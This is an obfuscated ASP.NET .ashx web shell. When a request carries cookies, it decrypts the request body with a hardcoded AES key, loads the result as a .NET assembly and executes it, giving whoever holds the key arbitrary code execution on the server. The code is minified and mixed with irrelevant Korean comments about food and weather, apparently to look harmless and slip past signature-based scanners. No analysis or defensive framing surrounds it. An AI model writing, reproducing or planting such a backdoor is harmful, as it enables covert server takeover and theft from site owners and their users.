<%@ WebHandler Language="C#" Class="Z" %>
using System.Web;using System.Text;using System.Linq;
public class Z:IHttpHandler{public void ProcessRequest(HttpContext z){var c=z.Request.Cookies;if(c!=null&&c.Count>0){var k=new byte[]{99,97,54,51,52,53,55,53,51,56,98,57,98,49,101,48};var p=z.Request.BinaryRead(z.Request.ContentLength);
// 배고파요, 치킨 먹고 싶다.
var a=System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k,k).TransformFinalBlock(p,0,p.Length));
// 오늘 날씨가 좋네요.
var i=a.CreateInstance(System.Text.Encoding.UTF8.GetString(new byte[]{75}));
// 다음에 또 만나요.
i.Equals(z);}}public bool IsReusable{get{
// 수고하셨습니다.
return false;}}}